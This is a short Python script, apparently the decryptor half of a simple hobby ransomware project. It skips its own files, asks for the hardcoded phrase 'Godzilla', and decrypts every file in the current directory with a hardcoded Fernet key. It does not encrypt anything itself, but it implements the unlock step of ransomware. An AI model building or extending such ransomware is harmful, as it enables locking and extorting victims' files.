#!/usr/bin/env/python3

import os

from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "encrypt.exe":
                continue
        if os.path.isfile(file):
                files.append(file)
print(files)
'''
with open("thekey.key","rb") as key:
	secretkey = key.read()
'''
secretkey = "PTcwlSWHacc59Wo8mD2g4Qba6jTcXgjLbXnVPHlfvaY="
secret_phrase = "Godzilla"

user_phrase = input("Enter the secret phrase to unlock the files : ")

while user_phrase != secret_phrase:
	print("Wrong Phrase!!! Try Again.")
	user_phrase = input("Enter the secret phrase to unlock the files : ")
else:
	for file in files:
	        with open(file,"rb") as thefile:
	                contents = thefile.read()
	        contents_decrypted = Fernet(secretkey).decrypt(contents)
	        with open(file,"wb") as thefile:
	                thefile.write(contents_decrypted)
	print("Your Files Have been decrypted  :)")                
